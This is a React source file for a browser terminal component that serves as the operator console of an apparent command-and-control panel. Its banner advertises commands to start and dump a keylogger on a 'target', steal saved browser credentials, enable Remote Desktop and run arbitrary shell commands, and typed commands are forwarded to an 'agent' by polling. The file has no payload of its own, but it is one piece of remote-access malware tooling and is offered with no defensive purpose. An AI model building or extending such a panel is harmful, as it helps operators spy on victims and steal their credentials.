"use client";

import React, { useEffect, useRef, useState } from "react";
import type { Terminal as XTerm } from "xterm";
import type { FitAddon } from "xterm-addon-fit";
import "xterm/css/xterm.css";

interface TerminalProps {
    onData?: (data: string) => void;
    output?: string;
}

const Terminal: React.FC<TerminalProps> = ({ onData, output }) => {
    const terminalRef = useRef<HTMLDivElement>(null);
    const xtermRef = useRef<XTerm | null>(null);
    const fitAddonRef = useRef<FitAddon | null>(null);
    const currentLine = useRef("");
    const [isTerminalReady, setIsTerminalReady] = useState(false);

    // Track if component is mounted to handle async imports correctly
    const renderRef = useRef(false);

    // Fix for stale closure: keep a ref to the latest onData
    const onDataRef = useRef(onData);
    useEffect(() => {
        onDataRef.current = onData;
    }, [onData]);

    useEffect(() => {
        // In Strict Mode, this might run twice.
        if (renderRef.current) return;
        renderRef.current = true;

        let isMounted = true;
        let resizeObserver: ResizeObserver | null = null;
        let term: XTerm | null = null;

        const initTerminal = async () => {
            // Dynamic imports
            const { Terminal: TerminalClass } = await import("xterm");
            const { FitAddon: FitAddonClass } = await import("xterm-addon-fit");

            if (!isMounted || !terminalRef.current) return;

            // 1. Instantiate Terminal
            term = new TerminalClass({
                cursorBlink: true,
                fontFamily: 'Menlo, Monaco, "Courier New", monospace',
                fontSize: 14,
                allowProposedApi: true,
                theme: {
                    background: "#09090b",
                    foreground: "#fafafa",
                    cursor: "#22c55e",
                },
            });

            // 2. Load Addon
            const fitAddon = new FitAddonClass();
            term.loadAddon(fitAddon);

            // Open terminal
            term.open(terminalRef.current);

            // Save instances
            xtermRef.current = term;
            fitAddonRef.current = fitAddon;

            // Fit immediately and on resize
            try {
                fitAddon.fit();
            } catch (e) {
                console.warn("Fit failed on init:", e);
            }

            // Use ResizeObserver for more robust resizing
            resizeObserver = new ResizeObserver(() => {
                try {
                    fitAddon.fit();
                } catch (err) {
                    console.log("ResizeObserver fit error", err);
                }
            });
            resizeObserver.observe(terminalRef.current);

            // 3. Welcome Message (Only if we don't have output already, handled by effect below)
            // Actually, we must initialize with SOMETHING or it looks broken until effect runs.
            // But we will let the effect handle the content sync.

            const welcome = [
                "",
                " \x1B[1;36m__   __\x1B[0m",
                " \x1B[1;36m\\ \\ / /_ _ _ __  ___ \x1B[0m",
                " \x1B[1;36m \\ V / _` | '_ \\/ __|\x1B[0m",
                " \x1B[1;36m  | | (_| | |_) \\__ \\\x1B[0m",
                " \x1B[1;36m  |_|\\__,_| .__/|___/\x1B[0m",
                " \x1B[1;36m          |_|        \x1B[0m",
                "",
                " \x1B[1;32mConnected to C2 Secure Shell\x1B[0m",
                " Type 'help' for a list of commands.",
                "",
                " \x1B[1;33mAvailable Commands:\x1B[0m",
                " \x1B[1mkeylogger start\x1B[0m    - Start keylogger on target",
                " \x1B[1mkeylogger stop\x1B[0m     - Stop keylogger",
                " \x1B[1mkeylogger dump\x1B[0m     - Retrieve captured keystrokes",
                " \x1B[1mcred\x1B[0m               - Steal saved credentials from browsers",
                " \x1B[1mrdp\x1B[0m                - Enable Remote Desktop Protocol",
                " \x1B[1mdisable-rdp\x1B[0m        - Disable Remote Desktop Protocol",
                " \x1B[1mexec <cmd>\x1B[0m         - Execute shell command (e.g., exec whoami)",
                " \x1B[1minfo\x1B[0m               - Get system information",
                " \x1B[1mterminate\x1B[0m          - Terminate agent connection",
                " \x1B[1mclear\x1B[0m / \x1B[1mcls\x1B[0m        - Clear terminal screen",
                "",
            ].join("\r\n");
            term.writeln(welcome);
            writtenOutputRef.current += welcome + "\r\n";

            // 4. Initial Prompt
            const PROMPT = "\r\n\x1B[1;32madmin@c2\x1B[0m:~$ ";
            term.write(PROMPT);
            writtenOutputRef.current += PROMPT;

            // 5. Event Handler
            term.onData((e) => {
                if (!term) return;

                // Process characters one by one
                for (let i = 0; i < e.length; i++) {
                    const char = e[i];
                    const code = e.charCodeAt(i);

                    if (code === 13) {
                        // CR (Enter)
                        term.write("\r\n");
                        writtenOutputRef.current += "\r\n";

                        const command = currentLine.current.trim();
                        if (command.length > 0) {
                            if (onDataRef.current) {
                                onDataRef.current(command);
                            }

                            const feedback =
                                "\r\n\x1B[90m[*] Command sent. Waiting for agent response (polling)...\x1B[0m";
                            term.write(feedback);

                            if (command === "clear" || command === "cls") {
                                term.clear();
                                writtenOutputRef.current = "";
                            }
                        } else {
                            term.write(PROMPT);
                            writtenOutputRef.current += PROMPT;
                        }
                        currentLine.current = "";
                    } else if (code === 127) {
                        // Backspace
                        if (currentLine.current.length > 0) {
                            term.write("\b \b");
                            currentLine.current = currentLine.current.slice(
                                0,
                                -1,
                            );
                        }
                    } else if (code >= 32 && code !== 127) {
                        // Printable
                        term.write(char);
                        writtenOutputRef.current += char;
                        currentLine.current += char;
                    }
                }
            });

            term.focus();
            if (isMounted) setIsTerminalReady(true);
        };

        initTerminal();

        return () => {
            isMounted = false;
            if (resizeObserver) resizeObserver.disconnect();
            if (xtermRef.current) {
                xtermRef.current.dispose();
                xtermRef.current = null;
            }
            renderRef.current = false;
        };
    }, []);

    // Track text already written to terminal to prevent duplication on re-renders
    const writtenOutputRef = useRef("");

    useEffect(() => {
        if (!xtermRef.current || !isTerminalReady) return;

        if (!output) {
            if (writtenOutputRef.current) {
                xtermRef.current.reset();
                const PROMPT = "\r\n\x1B[1;32madmin@c2\x1B[0m:~$ ";
                xtermRef.current.write(PROMPT);
                writtenOutputRef.current = "";
            }
            return;
        }

        if (output.startsWith(writtenOutputRef.current)) {
            const newPart = output.slice(writtenOutputRef.current.length);
            if (newPart) {
                xtermRef.current.write(newPart);
                writtenOutputRef.current = output;
            }
        } else {
            xtermRef.current.reset();
            xtermRef.current.write(output);
            writtenOutputRef.current = output;
        }
    }, [output, isTerminalReady]);

    return (
        <div
            ref={terminalRef}
            className="h-full w-full bg-zinc-950 rounded-lg overflow-hidden border border-zinc-800"
            style={{
                minHeight: "400px",
                display: "flex",
                flexDirection: "column",
            }}
        />
    );
};

export default Terminal;
